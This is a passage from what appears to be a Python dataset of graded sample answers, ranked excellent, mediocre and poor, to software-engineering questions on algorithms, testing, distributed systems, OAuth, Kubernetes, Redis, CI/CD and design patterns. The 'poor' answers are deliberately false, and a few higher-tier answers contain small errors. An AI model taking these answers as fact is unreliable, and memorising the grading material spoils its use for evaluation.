    mediocre=[
        "A BST has nodes where the left child is smaller and the right child is larger. Search is O(log n).",
        "Binary search trees allow O(log n) insert and search when balanced. Worst case is O(n) if unbalanced.",
        "In a BST, left < parent < right. You can search efficiently by going left or right at each node.",
    ],
    poor=[
        "A binary search tree sorts all elements and search is always O(1).",
        "BST is the same as a binary search algorithm.",
        "Binary trees always have O(log n) complexity regardless of balance.",
    ],
)

add(
    "Explain the difference between BFS and DFS graph traversal",
    "Is BFS vs DFS explained correctly with appropriate use cases?",
    excellent=[
        "BFS (Breadth-First Search): explore level by level using a queue.\nFinds shortest path in unweighted graphs.\nMemory: O(w) where w = max width.\n\nDFS (Depth-First Search): explore as deep as possible using a stack (or recursion).\nGood for: cycle detection, topological sort, maze solving.\nMemory: O(h) where h = max depth.\n\nBoth: O(V + E) time.",
        "from collections import deque\n\n# BFS — shortest path\ndef bfs(graph, start):\n    visited = {start}\n    queue = deque([start])\n    while queue:\n        node = queue.popleft()\n        for neighbor in graph[node]:\n            if neighbor not in visited:\n                visited.add(neighbor)\n                queue.append(neighbor)\n\n# DFS — recursive\ndef dfs(graph, node, visited=None):\n    if visited is None: visited = set()\n    visited.add(node)\n    for neighbor in graph[node]:\n        if neighbor not in visited:\n            dfs(graph, neighbor, visited)",
        "Use BFS for:\n- Shortest path (unweighted): social network distance, word ladder\n- Level-order tree traversal\n- Finding nodes within k distance\n\nUse DFS for:\n- Cycle detection\n- Topological sort (for dependency ordering)\n- Connected components\n- Path existence\n- Tree traversal (pre/in/post-order)",
        "BFS vs Dijkstra:\nBFS finds shortest path by hops (all edges weight=1).\nDijkstra finds shortest path by cost (weighted edges).\n\nA* adds heuristic to Dijkstra — used in pathfinding (games, GPS).",
    ],
    mediocre=[
        "BFS uses a queue and explores neighbors first. DFS uses a stack and explores as deep as possible.",
        "BFS is good for finding shortest paths. DFS is good for exploring all possibilities.",
        "BFS goes wide, DFS goes deep. Both visit all nodes.",
    ],
    poor=[
        "BFS is always better than DFS because it finds shortest paths.",
        "DFS is used only for trees, BFS is used for graphs.",
        "They are the same algorithm with different names.",
    ],
)

# ── Testing ───────────────────────────────────────────────────────────────────
add(
    "What is test-driven development and what are its benefits?",
    "Is TDD explained correctly with honest benefits and tradeoffs?",
    excellent=[
        "TDD cycle (Red → Green → Refactor):\n1. Write a failing test for the feature you'll build\n2. Write minimum code to make the test pass\n3. Refactor while keeping tests green\n\nBenefits:\n✓ Forces good interface design (hard to test = bad API)\n✓ Built-in regression suite\n✓ Documentation of expected behavior\n✓ Confident refactoring\n✓ Shorter debugging cycles",
        "Example:\n# Step 1: Failing test\ndef test_add():\n    assert add(2, 3) == 5  # NameError — add not defined yet\n\n# Step 2: Minimal implementation\ndef add(a, b):\n    return a + b  # test passes\n\n# Step 3: Refactor if needed (nothing to refactor here)\n\nTDD works best for:\n✓ Business logic functions\n✓ API endpoints\n✗ Exploratory code\n✗ UI components (use integration tests)",
        "Tradeoffs:\n+ Higher initial investment in test writing\n- Slower initial development velocity\n+ Lower long-term bug rate\n+ Safer refactoring at scale\n\nMock external dependencies:\nwith patch('mymodule.requests.get') as mock:\n    mock.return_value.json.return_value = {'status': 'ok'}\n    result = my_function()\n    assert result == 'ok'",
        "TDD + CI = safety net:\n- TDD gives you tests\n- CI runs them on every commit\n- PRs block on test failure\n\nBDD (Behavior-Driven Development) extends TDD:\nGiven: initial context\nWhen: action occurs\nThen: expected outcome\nTools: pytest-bdd, Cucumber",
    ],
    mediocre=[
        "TDD means writing tests before the code. It helps catch bugs early and gives confidence when changing code.",
        "Write a test, watch it fail, write code to make it pass, refactor. Repeat.",
        "TDD is good for teams but slows individual development.",
    ],
    poor=[
        "TDD means testing your code thoroughly after writing it.",
        "TDD slows you down so it's only useful for large projects.",
        "TDD requires a special framework and is hard to set up.",
    ],
)

add(
    "How do you mock dependencies in Python unit tests?",
    "Is mocking in Python explained correctly with practical examples?",
    excellent=[
        "Use unittest.mock.patch to replace dependencies during tests:\n\nfrom unittest.mock import patch, MagicMock\n\ndef test_send_email():\n    with patch('myapp.email.smtplib.SMTP') as mock_smtp:\n        mock_smtp.return_value.__enter__.return_value.sendmail = MagicMock()\n        result = send_email('user@example.com', 'Hello')\n        assert result is True\n        mock_smtp.assert_called_once()",
        "patch as decorator:\n@patch('myapp.services.requests.get')\ndef test_fetch_user(mock_get):\n    mock_get.return_value.status_code = 200\n    mock_get.return_value.json.return_value = {'id': 1, 'name': 'Alice'}\n    user = fetch_user(1)\n    assert user['name'] == 'Alice'\n    mock_get.assert_called_with('https://api.example.com/users/1')",
        "MagicMock for complex objects:\nfrom unittest.mock import MagicMock\n\ndb = MagicMock()\ndb.query.return_value.filter.return_value.first.return_value = User(id=1, name='Bob')\n\nresult = get_user(db, 1)\nassert result.name == 'Bob'\ndb.query.assert_called_once_with(User)",
        "spec= for safer mocks:\nmock = MagicMock(spec=requests.Response)\n# mock.nonexistent_attr → AttributeError (caught at test time)\n# without spec: mock.anything → MagicMock (hides bugs)\n\nside_effect for exceptions:\nmock.get.side_effect = ConnectionError('timeout')\n\nside_effect as iterable:\nmock.randint.side_effect = [3, 7, 2]  # returns in sequence",
    ],
    mediocre=[
        "Use unittest.mock.patch to replace real dependencies with mock objects during tests.",
        "from unittest.mock import MagicMock\nmock_db = MagicMock()\nmock_db.query.return_value = [...]",
        "Mocking lets you test code in isolation without needing real databases or external services.",
    ],
    poor=[
        "Just use real databases in tests, mocking is too complicated.",
        "Mocking is the same as stubbing. Use the mock library.",
        "Mocks always return None so check if the code handles None.",
    ],
)

# ── Algorithms ────────────────────────────────────────────────────────────────
add(
    "Explain Big O notation and why it matters",
    "Is Big O explained correctly with common examples?",
    excellent=[
        "Big O describes how an algorithm's time or space grows as input size n grows.\nIgnores constants and lower-order terms — describes worst-case asymptotic behavior.\n\nCommon complexities (best to worst):\nO(1)      — constant: array index lookup\nO(log n)  — logarithmic: binary search\nO(n)      — linear: loop through array\nO(n log n)— linearithmic: merge sort, heap sort\nO(n²)     — quadratic: nested loops (bubble sort)\nO(2^n)    — exponential: recursive Fibonacci (naive)\nO(n!)     — factorial: all permutations",
        "Why it matters:\nAlgorithm A: O(n²), runs in 1 second for n=1000\nAlgorithm B: O(n log n), 100x slower constant, but:\n  n=10,000: A takes 100s, B takes 1.3s\n  n=1,000,000: A takes 11.5 days, B takes 20s\n\nConstants matter at small n, complexity matters at large n.\nAlways think about the scale your code will operate at.",
        "Space complexity matters too:\nRecursive Fibonacci: O(2^n) time, O(n) space (call stack)\nMemoized Fibonacci: O(n) time, O(n) space\nIterative Fibonacci: O(n) time, O(1) space\n\nAmortized analysis: dynamic array append is O(1) amortized\n(occasional O(n) resize averaged over many operations)",
        "Recognizing complexity:\nfor i in range(n):                    # O(n)\n    for j in range(n):                # O(n²)\n        ...\n\nwhile n > 1: n //= 2                  # O(log n)\n\nfor i in range(n):                    # O(n log n)\n    binary_search(arr, target)         # O(log n)\n\nPython built-ins:\nlist.append: O(1) amortized\nlist.insert: O(n)\ndict[key]: O(1)\nset lookup: O(1)\n'in' list: O(n)",
    ],
    mediocre=[
        "Big O tells you how fast an algorithm is. O(1) is best, O(n²) is bad for large inputs.",
        "Big O describes worst-case performance as input grows. O(log n) means very efficient.",
        "O(n) means performance scales linearly with input size. O(n²) means it gets much worse for large n.",
    ],
    poor=[
        "Big O is the amount of memory an algorithm uses.",
        "O(1) is the slowest and O(n) is the fastest.",
        "Big O doesn't matter for modern computers because they are fast.",
    ],
)

add(
    "Implement a binary search algorithm in Python",
    "Is the binary search implementation correct?",
    excellent=[
        "def binary_search(arr, target):\n    left, right = 0, len(arr) - 1\n    while left <= right:\n        mid = left + (right - left) // 2  # avoids overflow\n        if arr[mid] == target:\n            return mid\n        elif arr[mid] < target:\n            left = mid + 1\n        else:\n            right = mid - 1\n    return -1  # not found\n\n# Time: O(log n), Space: O(1)",
        "# Recursive version\ndef binary_search(arr, target, left=0, right=None):\n    if right is None:\n        right = len(arr) - 1\n    if left > right:\n        return -1\n    mid = (left + right) // 2\n    if arr[mid] == target:\n        return mid\n    elif arr[mid] < target:\n        return binary_search(arr, target, mid + 1, right)\n    else:\n        return binary_search(arr, target, left, mid - 1)\n\n# Time: O(log n), Space: O(log n) stack",
        "# Python built-in: bisect module\nimport bisect\n\narr = [1, 3, 5, 7, 9, 11]\ntarget = 7\nidx = bisect.bisect_left(arr, target)\n\nif idx < len(arr) and arr[idx] == target:\n    print(f'Found at index {idx}')\nelse:\n    print('Not found')\n\n# bisect_left: index for insertion to maintain sorted order",
        "# Find leftmost occurrence (duplicates):\ndef search_leftmost(arr, target):\n    left, right = 0, len(arr)\n    while left < right:\n        mid = (left + right) // 2\n        if arr[mid] < target:\n            left = mid + 1\n        else:\n            right = mid\n    return left if left < len(arr) and arr[left] == target else -1",
    ],
    mediocre=[
        "def binary_search(arr, target):\n    left, right = 0, len(arr)-1\n    while left <= right:\n        mid = (left+right)//2\n        if arr[mid] == target: return mid\n        elif arr[mid] < target: left = mid+1\n        else: right = mid-1\n    return -1",
        "Binary search works on sorted arrays by repeatedly halving the search space.",
        "def binary_search(arr, target):\n    lo, hi = 0, len(arr)\n    while lo < hi:\n        mid = (lo+hi)//2\n        if arr[mid] < target: lo = mid+1\n        else: hi = mid\n    return lo if arr[lo]==target else -1",
    ],
    poor=[
        "def binary_search(arr, target):\n    for i in range(len(arr)):\n        if arr[i] == target:\n            return i\n    return -1  # This is linear search, not binary",
        "Binary search: check the middle, if too small go right, if too big go left, repeat.",
        "def binary_search(arr, n):\n    return arr.index(n)",
    ],
)

# ── Additional mixed topics ───────────────────────────────────────────────────
add(
    "What is the CAP theorem in distributed systems?",
    "Is the CAP theorem explained correctly?",
    excellent=[
        "CAP theorem (Brewer's theorem): a distributed system can guarantee at most 2 of 3:\nC — Consistency: all nodes see the same data at the same time\nA — Availability: every request receives a response (may not be latest data)\nP — Partition tolerance: system continues despite network partitions\n\nSince network partitions are inevitable, real systems choose CP or AP.\nCP: consistent but may refuse requests during partition (HBase, ZooKeeper, etcd)\nAP: available but may return stale data (Cassandra, DynamoDB, CouchDB)",
        "CA (no partition tolerance) is only possible for single-node systems.\nDistributed systems must choose CP or AP:\n\nCP (consistency over availability):\n- Bank transactions (can't show wrong balance)\n- User identity/auth\n- Inventory management\n\nAP (availability over consistency):\n- Shopping cart (show stale cart, merge on checkout)\n- Social media feeds\n- DNS\n- Metrics/analytics",
        "PACELC extends CAP:\nIf Partition: choose A or C (CAP)\nElse (normal operation): choose Latency or Consistency\n\nCassandra (AP): low latency, eventual consistency\nMySQL (CP): consistent, higher latency\nSpanner: claims to be CA using TrueTime for clock sync",
        "Eventual consistency: given no new updates, all replicas converge to the same value.\nMonotonic read consistency: if you read a value, subsequent reads return same or newer.\nRead-your-writes consistency: after writing, you always see your write.",
    ],
    mediocre=[
        "CAP theorem says you can only have two of Consistency, Availability, and Partition tolerance in a distributed system.",
        "Distributed databases must choose between being consistent or always available when network partitions happen.",
        "CP databases sacrifice availability for consistency. AP databases sacrifice consistency for availability.",
    ],
    poor=[
        "CAP stands for CPU, API, and Persistence in distributed systems.",
        "CAP theorem means you need all three properties to build a good database.",
        "Just use SQL databases to avoid CAP theorem problems.",
    ],
)

add(
    "Explain OAuth 2.0 and how it enables third-party authorization",
    "Is the OAuth 2.0 flow explained correctly?",
    excellent=[
        "OAuth 2.0 allows a user to grant a third-party app access to their resources WITHOUT sharing credentials.\n\nAuthorization Code Flow (most secure):\n1. User clicks 'Login with Google'\n2. App redirects to Google with client_id, scope, redirect_uri\n3. User logs into Google, grants permissions\n4. Google redirects back with authorization code\n5. App exchanges code for access token (server-to-server)\n6. App uses access token to call Google APIs\n\nKey: credentials never leave Google. App only gets a scoped token.",
        "OAuth 2.0 roles:\n- Resource Owner: the user\n- Client: third-party app requesting access\n- Authorization Server: issues tokens (Google, GitHub, Okta)\n- Resource Server: API that accepts tokens (Gmail API, GitHub API)\n\nGrant types:\n- Authorization Code: web apps (most secure)\n- PKCE extension: single-page apps\n- Client Credentials: machine-to-machine\n- Device Code: smart TVs\n\nOAuth 2.0 ≠ authentication. Add OpenID Connect (OIDC) for identity (id_token).",
        "Token types:\nAccess token: short-lived (1hr), used to call APIs\nRefresh token: long-lived, used to get new access tokens without re-login\nID token (OIDC): JWT containing user identity\n\nScopes define what the app can do:\nscope=read:user,repo — GitHub read access to profile and repos",
        "Security: never put access tokens in URLs (appear in logs).\nUse Authorization: Bearer <token> header.\nStore refresh tokens server-side or in httpOnly cookies.\nValidate state parameter to prevent CSRF.",
    ],
    mediocre=[
        "OAuth 2.0 lets users authorize apps to access their data without sharing passwords. It uses access tokens.",
        "The user logs in to the provider, grants permissions, and the app gets a token to access the API.",
        "OAuth 2.0 separates authentication from authorization using tokens.",
    ],
    poor=[
        "OAuth 2.0 is an encryption standard for storing passwords.",
        "OAuth and JWT are the same thing.",
        "Use OAuth when you need to encrypt API responses.",
    ],
)

add(
    "What is GraphQL and how does it differ from REST?",
    "Is the GraphQL vs REST distinction explained correctly?",
    excellent=[
        "GraphQL: query language where clients specify exactly what data they need.\n\nREST:\nGET /users/1          → entire user object (over-fetching)\nGET /users/1/posts    → separate request (under-fetching)\nGET /users/1/posts/5/comments  → third request\n\nGraphQL (single request):\nquery {\n  user(id: 1) {\n    name\n    posts(last: 5) {\n      title\n      comments { body }\n    }\n  }\n}",
        "GraphQL advantages:\n- No over-fetching: get only fields you request\n- No under-fetching: get related data in one request\n- Strongly typed schema\n- Self-documenting (introspection)\n- Easy API evolution (add fields, deprecate without versions)\n\nGraphQL disadvantages:\n- Complex caching (POST requests, no URL-based cache)\n- Learning curve\n- N+1 query problem (solve with DataLoader)\n- Overkill for simple APIs",
        "GraphQL operations:\nquery — read (like GET)\nmutation — write (like POST/PUT/DELETE)\nsubscription — real-time (WebSocket)\n\nSchema-first:\ntype User {\n  id: ID!\n  name: String!\n  email: String!\n  posts: [Post!]!\n}\ntype Query {\n  user(id: ID!): User\n}\ntype Mutation {\n  createUser(name: String!, email: String!): User!\n}",
        "When to use GraphQL:\n✓ Complex domain with many relationships\n✓ Multiple clients (mobile/web) needing different data\n✓ Rapid product iteration\n✗ Simple CRUD APIs\n✗ File uploads are awkward\n✗ Public APIs (REST is more universal)\n\nPopular: GitHub API v4, Shopify, Airbnb, Twitter API",
    ],
    mediocre=[
        "GraphQL lets clients request exactly the data they need in one query. REST has fixed endpoints that may return more or less data than needed.",
        "With GraphQL you send one request and get exactly what you asked for. REST uses multiple endpoints.",
        "GraphQL is more flexible than REST but harder to learn and implement.",
    ],
    poor=[
        "GraphQL is faster than REST because it uses a graph database.",
        "GraphQL is replacing REST completely in modern applications.",
        "GraphQL uses SQL under the hood to query the database.",
    ],
)

add(
    "Explain microservices vs monolithic architecture",
    "Is the comparison accurate with honest tradeoffs?",
    excellent=[
        "Monolithic: entire app deployed as one unit. All features in one process.\n+ Simple to develop, test, deploy initially\n+ No network latency between components\n+ Easy to debug (single log stream)\n- Scaling requires scaling everything\n- Long build/deploy cycles at scale\n- Tech stack locked in\n- Large codebase becomes hard to navigate",
        "Microservices: app split into small, independently deployable services.\nEach service: single responsibility, own database, own language/stack.\n+ Scale services independently\n+ Polyglot (right tool per job)\n+ Deploy services independently\n+ Fault isolation\n- Network complexity (service discovery, timeouts)\n- Data consistency across services (distributed transactions)\n- Much more operational overhead\n- Debugging distributed traces",
        "Migration path:\nStranger Fig pattern: incrementally extract features from monolith to services.\n1. New features as services\n2. Extract high-growth or independently scalable modules\n3. Leave stable core in monolith\n\nDon't start with microservices — most teams aren't ready for the operational overhead.",
        "When microservices make sense:\n✓ Large team (Conway's law: architecture mirrors org structure)\n✓ Different scaling requirements per service\n✓ Different release cadences\n✓ Need polyglot tech stack\n\nWhen to stay monolithic:\n✓ Small team\n✓ Early-stage product (requirements changing fast)\n✓ Simple domain\n✓ 'Modular monolith' can give many benefits without distributed system complexity",
    ],
    mediocre=[
        "Monolithic means all code in one application. Microservices splits the app into small independent services.",
        "Microservices are better for large applications because you can scale and deploy parts independently.",
        "Monolith is simpler to start with. Microservices add complexity but are more scalable.",
    ],
    poor=[
        "Microservices are always better than monoliths for any application.",
        "Monolithic applications cannot be scaled at all.",
        "Microservices are just multiple copies of the same monolith.",
    ],
)

# ── Kubernetes ───────────────────────────────────────────────────────────────
add(
    "What is a Kubernetes Pod and how does it differ from a container?",
    "Is the Pod concept explained correctly?",
    excellent=[
        "A Pod is the smallest deployable unit in Kubernetes — one or more containers that share network and storage.\n\nKey properties:\n- Containers in a Pod share localhost and volumes\n- Pods are ephemeral (killed and replaced, not restarted in-place)\n- Each Pod gets its own IP address\n- Use multiple containers per Pod only for sidecar patterns (logging, proxy)\n\nPod spec:\napiVersion: v1\nkind: Pod\nmetadata:\n  name: my-app\nspec:\n  containers:\n  - name: app\n    image: myapp:1.0\n    ports:\n    - containerPort: 8080",
        "Single vs multi-container Pod:\nSingle: most common, one app container.\nSidecar pattern: main app + helper that enhances it.\n  Example: app container + log-shipper sidecar (both read same log volume)\n  Example: app + envoy proxy (service mesh)\n\nPods vs Deployments:\nNever create Pods directly in production — use Deployment.\nDeployment manages ReplicaSet which manages Pods.\nIf a Pod crashes, Deployment recreates it.",
        "Pod lifecycle:\nPending → Running → Succeeded/Failed\n\nInitContainers run before main containers:\n- DB migration\n- Wait for dependency to be ready\n\nProbes:\nlivenessProbe: is container healthy? (kill if failing)\nreadinessProbe: is container ready for traffic?\nstartupProbe: is app started? (for slow start apps)",
        "Resource limits (critical for production):\nresources:\n  requests:\n    memory: '128Mi'\n    cpu: '100m'\n  limits:\n    memory: '256Mi'\n    cpu: '500m'\n\nRequests: what the scheduler reserves.\nLimits: max allowed. OOMKilled if memory exceeded.",
    ],
    mediocre=[
        "A Pod is a group of one or more containers that run together on the same node and share network.",
        "Pods are the basic unit in Kubernetes. Each Pod can contain one or more containers.",
        "A Pod wraps containers and gives them a shared IP address. Pods can be scaled by Deployments.",
    ],
    poor=[
        "A Pod is the same as a Docker container in Kubernetes.",
        "Pods are Kubernetes nodes that run your applications.",
        "You should always put all your containers in one Pod.",
    ],
)

add(
    "Explain Kubernetes Deployments, Services, and Ingress",
    "Are these three core Kubernetes resources explained correctly?",
    excellent=[
        "Deployment: manages rolling updates and scaling of Pods.\napiVersion: apps/v1\nkind: Deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels: {app: myapp}\n  template:\n    spec:\n      containers:\n      - name: app\n        image: myapp:1.2\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxSurge: 1\n      maxUnavailable: 0",
        "Service: stable endpoint for a set of Pods (Pods come and go, Service IP is stable).\nTypes:\n- ClusterIP: internal only (default)\n- NodePort: expose on every node's IP:port\n- LoadBalancer: cloud LB (ELB, etc.)\n\nIngress: HTTP router — routes by host/path to Services.\napiVersion: networking.k8s.io/v1\nkind: Ingress\nspec:\n  rules:\n  - host: api.example.com\n    http:\n      paths:\n      - path: /\n        backend:\n          service: {name: api-svc, port: {number: 80}}",
        "Service selects Pods via label selectors:\nService selector: app=myapp → matches all Pods with app=myapp label\nkube-proxy creates iptables rules to route Service IP to Pod IPs.\n\nIngress controller (nginx, traefik, AWS ALB) must be installed separately.\nIngress provides: TLS termination, path-based routing, host-based routing.",
        "Health checks enable zero-downtime updates:\nreadinessProbe: HTTP GET /health → only route traffic when ready\nDeployment won't proceed if new Pods fail readiness.\n\nkubectl commands:\nkubectl get pods\nkubectl describe pod <name>\nkubectl logs <pod> -f\nkubectl exec -it <pod> -- sh\nkubectl rollout undo deployment/myapp",
    ],
    mediocre=[
        "Deployment manages replicated Pods. Service provides a stable IP. Ingress routes external traffic to Services.",
        "Use Deployment to run your app, Service to expose it inside the cluster, and Ingress to expose it externally.",
        "Deployments handle pod scaling and updates. Services load balance between pods. Ingress manages HTTP routing.",
    ],
    poor=[
        "Kubernetes only needs a Service to run applications.",
        "Ingress is the same as a Load Balancer and they should not both be used.",
        "Deployments are for databases and Services are for web apps.",
    ],
)

# ── Redis / Caching ───────────────────────────────────────────────────────────
add(
    "Explain Redis and common use cases for it",
    "Is Redis explained correctly with practical use cases?",
    excellent=[
        "Redis is an in-memory data structure store — key-value store with rich data types.\n\nData types:\n- String: counters, cached values\n- List: queues, recent items\n- Hash: object storage\n- Set: unique members, tags\n- Sorted Set: leaderboards, range queries\n- Stream: event log\n\nUse cases:\n- Cache (most common): reduce DB queries\n- Session storage: fast auth token lookup\n- Rate limiting: INCR with TTL\n- Pub/Sub: real-time notifications\n- Job queue: Celery, RQ backend",
        "Caching pattern:\n# Cache-aside (lazy loading)\ndef get_user(user_id):\n    cached = redis.get(f'user:{user_id}')\n    if cached:\n        return json.loads(cached)  # cache hit\n    user = db.query(User).get(user_id)  # cache miss\n    redis.setex(f'user:{user_id}', 300, json.dumps(user))  # 5 min TTL\n    return user\n\nTTL prevents stale data accumulation.",
        "Rate limiting with Redis:\ndef is_rate_limited(user_id, limit=100):\n    key = f'rate:{user_id}:{datetime.now().minute}'\n    count = redis.incr(key)\n    if count == 1:\n        redis.expire(key, 60)  # reset per minute\n    return count > limit\n\nDistributed lock:\nwith redis.lock('task:process', timeout=10):\n    process_task()",
        "Redis persistence:\nRDB: point-in-time snapshots (fast restore, possible data loss)\nAOF: append-only log of operations (durable, larger files)\n\nReplication: master-replica for read scaling.\nSentinel: HA with automatic failover.\nCluster: sharding across multiple nodes.\n\nRedis vs Memcached:\nRedis: rich types, persistence, pub/sub\nMemcached: simpler, multi-threaded",
    ],
    mediocre=[
        "Redis is an in-memory key-value store used for caching. It's much faster than database queries.",
        "Use Redis to cache frequently accessed data and reduce database load. It supports many data types.",
        "Redis stores data in memory so reads and writes are very fast. Common for caching and sessions.",
    ],
    poor=[
        "Redis is a type of SQL database that runs in memory.",
        "Redis is used for permanent storage of user data.",
        "You should always use Redis instead of a database for better performance.",
    ],
)

add(
    "What is cache invalidation and what strategies exist?",
    "Are cache invalidation strategies explained correctly?",
    excellent=[
        "Cache invalidation: removing or updating stale cached data when source changes.\n\nStrategies:\n1. TTL (Time-To-Live): entries expire after N seconds.\n   Simple, handles gradual staleness. Set TTL based on acceptable staleness.\n\n2. Write-through: write to cache AND DB simultaneously.\n   Pro: cache always fresh. Con: write latency.\n\n3. Write-behind (write-back): write to cache, async sync to DB.\n   Pro: fast writes. Con: data loss risk.\n\n4. Cache-aside: read from cache, miss → read DB + populate cache.\n   Most common pattern.",
        "Event-driven invalidation:\nWhen DB row changes → publish event → cache service deletes/updates cache entry.\nImplementation: DB triggers, CDC (Change Data Capture), application-level events.\n\nContent-addressed keys:\n/static/app.abc123.js — URL changes when content changes → no invalidation needed.\nUsed for CDN caching of static assets.\n\n'There are only two hard things in CS: cache invalidation and naming things.' — Phil Karlton",
        "Cache stampede (thundering herd):\nMany requests miss cache simultaneously → all hit DB → DB overloaded.\n\nSolutions:\n- Probabilistic early expiration: refresh before TTL expires\n- Background refresh: async refresh before expiry\n- Distributed lock: only one thread refreshes, others wait\n- Stale-while-revalidate: serve stale while refreshing in background",
        "Key design matters:\nToo granular: 'user:1:name', 'user:1:email' → invalidate many keys\nToo coarse: 'user:1' → invalidate everything for user 1\n\nPrefixes enable batch invalidation:\nredis.delete(*redis.keys('user:42:*'))  # invalidate all user 42 cache\nBut: redis.keys() is O(N) — use SCAN in production.",
    ],
    mediocre=[
        "Cache invalidation means removing old cached data when it changes. Common strategies are TTL and explicit deletion.",
        "Set TTL on cached items so they expire. Or delete the cache key when the source data changes.",
        "Write-through caches update the cache on every write. Cache-aside checks cache first then database.",
    ],
    poor=[
        "Cache invalidation means clearing all caches when anything changes.",
        "Always use infinite TTL for best performance.",
        "Cache invalidation is not important if your data doesn't change often.",
    ],
)

# ── CI/CD ─────────────────────────────────────────────────────────────────────
add(
    "Explain CI/CD and the difference between continuous integration and continuous deployment",
    "Is CI/CD explained accurately?",
    excellent=[
        "CI (Continuous Integration): developers frequently merge code into main branch. Each merge triggers automated build and test pipeline.\n\nGoal: detect integration bugs early, maintain always-shippable codebase.\n\nCD (Continuous Delivery): every commit that passes CI is automatically deployable to production (but may require manual approval).\n\nCD (Continuous Deployment): every passing commit is automatically deployed to production without manual intervention.",
        "Typical CI/CD pipeline:\n1. Developer pushes code\n2. CI server (GitHub Actions, Jenkins, GitLab CI) triggers\n3. Install dependencies\n4. Run linters/formatters\n5. Run unit tests\n6. Run integration tests\n7. Build Docker image\n8. Push to registry\n9. Deploy to staging\n10. Run E2E tests\n11. Deploy to production (CD)\n12. Monitor for errors",
        "GitHub Actions example:\nname: CI\non: [push, pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v3\n    - uses: actions/setup-python@v4\n      with: {python-version: '3.11'}\n    - run: pip install -r requirements.txt\n    - run: pytest --cov\n    - run: coverage report --fail-under=90",
        "Deployment strategies:\nRolling: replace old instances gradually\nBlue-green: two identical envs, switch traffic instantly\nCanary: route 5% of traffic to new version, monitor, then roll out\nFeature flags: deploy code but toggle features independently\n\nBlue-green enables instant rollback: switch traffic back to blue.",
    ],
    mediocre=[
        "CI means automatically testing code on every commit. CD means automatically deploying tested code.",
        "Continuous Integration runs tests automatically. Continuous Deployment deploys to production automatically.",
        "CI/CD automates building, testing, and deploying software to reduce manual errors.",
    ],
    poor=[
        "CI/CD stands for Code Integration and Code Deployment.",
        "CI/CD is only useful for large teams. Small teams should deploy manually.",
        "You need to buy CI/CD software. It cannot be set up for free.",
    ],
)

# ── Design Patterns ───────────────────────────────────────────────────────────
add(
    "Explain the Singleton design pattern and when to use it",
    "Is the Singleton pattern explained correctly with appropriate caveats?",
    excellent=[
        "Singleton: ensures only one instance of a class exists and provides a global access point.\n\nPython implementation:\nclass Singleton:\n    _instance = None\n    def __new__(cls):\n        if cls._instance is None:\n            cls._instance = super().__new__(cls)\n        return cls._instance\n\ns1 = Singleton()\ns2 = Singleton()\nassert s1 is s2  # True — same object",
        "Thread-safe Singleton in Python:\nimport threading\n\nclass Singleton:\n    _instance = None\n    _lock = threading.Lock()\n    \n    def __new__(cls):\n        if cls._instance is None:\n            with cls._lock:\n                if cls._instance is None:  # double-check\n                    cls._instance = super().__new__(cls)\n        return cls._instance\n\nUse cases: logging, DB connection pool, config manager.\nAvoid: testing is hard (shared state), tight coupling, threading issues.",
        "Monostate (Borg) pattern — alternative:\nclass Borg:\n    _shared = {}\n    def __init__(self):\n        self.__dict__ = self._shared\n\nAll instances share state but are distinct objects.\nEasier to subclass and test than true Singleton.",
        "In Python, module-level variables ARE singletons:\n# config.py\nsettings = Settings()  # created once on import\n# elsewhere\nfrom config import settings  # same object everywhere\n\nOften a better choice than implementing Singleton explicitly.",
    ],
    mediocre=[
        "Singleton ensures a class has only one instance. Used for shared resources like database connections.",
        "class Singleton:\n    _instance = None\n    def __new__(cls):\n        if not cls._instance:\n            cls._instance = super().__new__(cls)\n        return cls._instance",
        "Use Singleton for things like loggers and config objects that should only exist once.",
    ],
    poor=[
        "Singleton is the best design pattern and should be used everywhere.",
        "Singleton means the class can only be extended once.",
        "Use Singleton to make all your classes thread-safe.",
    ],
)

add(
    "Explain the Observer design pattern with a Python example",
    "Is the Observer pattern implemented correctly?",
    excellent=[
        "Observer: when one object changes state, all its dependents are notified automatically.\nAlso known as Event/Publisher-Subscriber.\n\nclass EventEmitter:\n    def __init__(self):\n        self._listeners = {}\n    def on(self, event, fn):\n        self._listeners.setdefault(event, []).append(fn)\n    def emit(self, event, *args, **kwargs):\n        for fn in self._listeners.get(event, []):\n            fn(*args, **kwargs)\n\nemitter = EventEmitter()\nemitter.on('user_created', send_welcome_email)\nemitter.on('user_created', create_profile)\nemitter.emit('user_created', user)",
        "Classic OOP implementation:\nfrom abc import ABC, abstractmethod\n\nclass Observer(ABC):\n    @abstractmethod\n    def update(self, event): ...\n\nclass Subject:\n    def __init__(self):\n        self._observers = []\n    def subscribe(self, obs): self._observers.append(obs)\n    def notify(self, event):\n        for obs in self._observers:\n            obs.update(event)\n\nclass StockPrice(Subject):\n    def set_price(self, price):\n        self.price = price\n        self.notify({'price': price})",
        "Observer decouples producers from consumers:\nBefore: user_service directly calls email_service, analytics, notification\nAfter: user_service emits 'user_created', each service subscribes independently\n\nBenefits: add/remove listeners without changing Subject.\nCaution: hard to trace what happens for an event; can create infinite loops.",
        "Python stdlib: Observer via asyncio events or threading.Event.\nFrameworks: Django signals, SQLAlchemy events.\n\n# Django signal example:\nfrom django.db.models.signals import post_save\nfrom django.dispatch import receiver\n\n@receiver(post_save, sender=User)\ndef on_user_created(sender, instance, created, **kwargs):\n    if created:\n        send_welcome_email(instance.email)",
    ],
    mediocre=[
        "Observer pattern lets objects subscribe to events. When the event occurs, all subscribers are notified.",
        "The subject maintains a list of observers. When it changes, it calls update() on all observers.",
        "Use Observer to decouple components that need to react to state changes.",
    ],
    poor=[
        "Observer pattern is used to watch files for changes on disk.",
        "Observers are the same as callbacks.",
        "Observer pattern should be used instead of functions for all event handling.",
    ],
)

add(
    "What is dependency injection and why is it useful?",
    "Is dependency injection explained correctly with practical benefits?",
    excellent=[
        "Dependency Injection (DI): pass dependencies into a class instead of creating them inside.\n\nWithout DI:\nclass UserService:\n    def __init__(self):\n        self.db = PostgresDB()  # hard-coded dependency\n        self.mailer = SMTPMailer()  # hard to test/swap\n\nWith DI:\nclass UserService:\n    def __init__(self, db: Database, mailer: Mailer):\n        self.db = db\n        self.mailer = mailer\n\n# Inject real or test dependencies\nservice = UserService(db=PostgresDB(), mailer=SMTPMailer())\ntest_service = UserService(db=MockDB(), mailer=MockMailer())",
